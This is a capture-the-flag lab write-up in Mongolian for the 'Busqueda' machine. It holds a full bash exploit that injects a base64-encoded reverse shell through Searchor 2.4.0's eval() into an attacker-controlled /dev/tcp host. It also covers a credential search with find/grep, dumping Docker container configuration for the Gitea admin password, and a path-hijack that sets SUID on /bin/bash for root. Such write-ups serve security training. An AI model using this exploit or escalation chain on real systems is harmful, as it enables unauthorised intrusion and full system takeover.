# Busqueda - Searcher 2.4.0 / Docker Inspect

**Searcher 2.4.0 нь eval()-ийг filter-гүй ажиллуулдаг тул RCE-д өртөж байна.**

```bash
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell"
fi
```

## Find Cody user's Gitea password

```bash
find / -type f -exec grep -iH "searcher.htb" {} \; 2> /dev/null
```

[image]

## Sudo shell escape

[image]

**docker-inspect, docker-ps-ийг ашиглах боломжтой байна.**

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

[image]

## Found Gitea administrator password

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{.Config}}' 960873171e2e
```

[image]

**Administrator user-ээр Gitea руу орох үед /opt/script directory-д байсан scripts байна.**

**Мөн энэ ./full-checkup.sh-ийн замыг бүтэн зааж өгөөгүй тул Path Hijacking-д өртөж байна.**

[image]

## Shell as Root!

```bash
nano /dev/shm/full-checkup.sh
#!/bin/bash
chmod +s /bin/bash
```

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

[image]

```bash
/bin/bash -p
```
